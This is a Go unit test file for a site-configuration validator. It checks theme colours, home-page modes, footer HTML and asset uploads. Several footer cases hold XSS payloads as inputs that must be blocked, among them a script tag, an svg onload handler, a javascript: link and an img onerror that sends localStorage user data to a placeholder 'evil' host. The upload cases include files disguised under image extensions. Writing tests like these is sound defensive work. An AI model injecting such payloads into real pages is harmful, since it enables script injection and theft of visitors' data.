package siteconfig

import (
	"strings"
	"testing"

	"github.com/QuantumNous/new-api/internal/platform/apperr"
)

func TestValidatePatch(t *testing.T) {
	cases := []struct {
		name string
		in   SiteConfigPatch
		want string // "" 表示通过
	}{
		{"empty patch ok", SiteConfigPatch{}, ""},
		{"theme in palette", SiteConfigPatch{ThemeColor: strptr("#52c41a")}, ""},
		{"theme uppercase ok", SiteConfigPatch{ThemeColor: strptr("#52C41A")}, ""},
		{"theme out of palette", SiteConfigPatch{ThemeColor: strptr("#abcdef")}, "THEME_NOT_IN_PALETTE"},
		{"theme empty", SiteConfigPatch{ThemeColor: strptr("")}, "THEME_NOT_IN_PALETTE"},
		{"home default", SiteConfigPatch{HomeMode: hmptr(HomeModeDefault)}, ""},
		{"home config", SiteConfigPatch{HomeMode: hmptr(HomeModeConfig)}, ""},
		{"home custom_html locked", SiteConfigPatch{HomeMode: hmptr(HomeModeCustomHTML)}, "HOME_MODE_LOCKED"},
		{"home unknown locked", SiteConfigPatch{HomeMode: hmptr(HomeMode("x"))}, "HOME_MODE_LOCKED"},
		{"custom_html set locked", SiteConfigPatch{CustomHTML: strptr("<h1>hi</h1>")}, "HOME_MODE_LOCKED"},
		{"custom_html empty ok", SiteConfigPatch{CustomHTML: strptr("")}, ""},
		{"custom_html whitespace ok", SiteConfigPatch{CustomHTML: strptr("   ")}, ""},
		{"basic fields ok", SiteConfigPatch{SiteName: strptr("Acme"), Footer: strptr("(c) 2026")}, ""},
		{"reserved fields stored ok", SiteConfigPatch{TemplateKey: strptr("B"), BannerJSON: strptr("[]"), EnabledModules: []string{"x"}}, ""},
		// Footer：允许良性 HTML（链接/加粗），拒绝脚本 / 事件处理器 / 危险标签 / 伪协议 / 超长。
		{"footer plain ok", SiteConfigPatch{Footer: strptr("© 2026 我的站")}, ""},
		{"footer benign link ok", SiteConfigPatch{Footer: strptr(`<a href="/tos">条款</a> · <b>联系</b>`)}, ""},
		{"footer empty ok", SiteConfigPatch{Footer: strptr("")}, ""},
		{"footer script blocked", SiteConfigPatch{Footer: strptr("<script>alert(1)</script>")}, "FOOTER_INVALID"},
		{"footer img onerror blocked", SiteConfigPatch{Footer: strptr(`<img src=x onerror="fetch('//evil/?c='+localStorage.user)">`)}, "FOOTER_INVALID"},
		{"footer svg onload blocked", SiteConfigPatch{Footer: strptr(`<svg onload=alert(1)>`)}, "FOOTER_INVALID"},
		{"footer js uri blocked", SiteConfigPatch{Footer: strptr(`<a href="javascript:alert(1)">x</a>`)}, "FOOTER_INVALID"},
		{"footer iframe blocked", SiteConfigPatch{Footer: strptr(`<iframe src="//evil"></iframe>`)}, "FOOTER_INVALID"},
		{"footer too long blocked", SiteConfigPatch{Footer: strptr(strings.Repeat("a", MaxFooterBytes+1))}, "FOOTER_INVALID"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := ValidatePatch(c.in)
			got := ""
			if err != nil {
				got = apperr.CodeOf(err)
			}
			if got != c.want {
				t.Fatalf("ValidatePatch code = %q, want %q", got, c.want)
			}
		})
	}
}

func TestValidateUpload(t *testing.T) {
	big := make([]byte, MaxAssetBytes+1)
	copy(big, []byte("\x89PNG\r\n\x1a\n"))
	atLimit := make([]byte, MaxAssetBytes)
	copy(atLimit, []byte("\x89PNG\r\n\x1a\n"))

	cases := []struct {
		name string
		f    File
		want string // "" 表示通过
	}{
		// 允许
		{"png ok", File{Name: "a.png", Data: pngData}, ""},
		{"jpg ok", File{Name: "a.jpg", Data: jpegData}, ""},
		{"jpeg alias ok", File{Name: "a.jpeg", Data: jpegData}, ""},
		{"webp ok", File{Name: "a.webp", Data: webpData}, ""},
		{"uppercase ext ok", File{Name: "A.PNG", Data: pngData}, ""},
		{"at size limit ok", File{Name: "a.png", Data: atLimit}, ""},
		// 类型黑名单（按扩展名拒）
		{"svg forbidden", File{Name: "a.svg", Data: []byte("<svg/>")}, "ASSET_TYPE_FORBIDDEN"},
		{"html forbidden", File{Name: "a.html", Data: []byte("<html></html>")}, "ASSET_TYPE_FORBIDDEN"},
		{"js forbidden", File{Name: "a.js", Data: []byte("alert(1)")}, "ASSET_TYPE_FORBIDDEN"},
		{"exe forbidden", File{Name: "a.exe", Data: []byte("MZ\x90\x00")}, "ASSET_TYPE_FORBIDDEN"},
		{"zip forbidden", File{Name: "a.zip", Data: []byte("PK\x03\x04")}, "ASSET_TYPE_FORBIDDEN"},
		{"no ext forbidden", File{Name: "noext", Data: pngData}, "ASSET_TYPE_FORBIDDEN"},
		// 改名绕过（扩展名合法但内容嗅探不符）
		{"disguised html as png", File{Name: "evil.png", Data: []byte("<html><body>x</body></html>")}, "ASSET_TYPE_FORBIDDEN"},
		{"disguised text as jpg", File{Name: "evil.jpg", Data: []byte("just plain text, not an image")}, "ASSET_TYPE_FORBIDDEN"},
		{"empty data forbidden", File{Name: "a.png", Data: nil}, "ASSET_TYPE_FORBIDDEN"},
		// 体积
		{"too large", File{Name: "a.png", Data: big}, "ASSET_TOO_LARGE"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := ValidateUpload(c.f)
			got := ""
			if err != nil {
				got = apperr.CodeOf(err)
			}
			if got != c.want {
				t.Fatalf("ValidateUpload(%q) code = %q, want %q", c.f.Name, got, c.want)
			}
		})
	}
}
